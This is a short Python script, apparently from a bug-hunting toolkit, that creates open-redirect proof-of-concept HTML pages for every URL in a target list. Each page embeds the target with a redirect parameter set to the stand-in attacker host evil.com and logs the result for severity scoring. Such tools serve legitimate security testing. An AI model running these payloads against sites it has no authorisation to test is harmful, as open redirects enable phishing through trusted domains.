import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def generate_redirect_poc(url, param="redirect", destination="https://evil.com"):
    test_url = f"{url}?{param}={destination}"

    html = f"""<html>
  <body>
    <h3>Open Redirect PoC</h3>
    <iframe src="{test_url}" width="800" height="600"></iframe>
  </body>
</html>"""

    filename = f"redirect_poc_{param}.html"
    with open(filename, "w") as f:
        f.write(html)

    log_to_text(f"[REDIRECT_POC] {test_url} -> {filename}")
    ai_trigger_if_needed("Open Redirect", test_url, destination, html, "medium")
    print(f"[+] Open Redirect PoC generisan: {filename}")
    return filename

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        targets = f.read().splitlines()
    
    for url in targets:
        generate_redirect_poc(url)
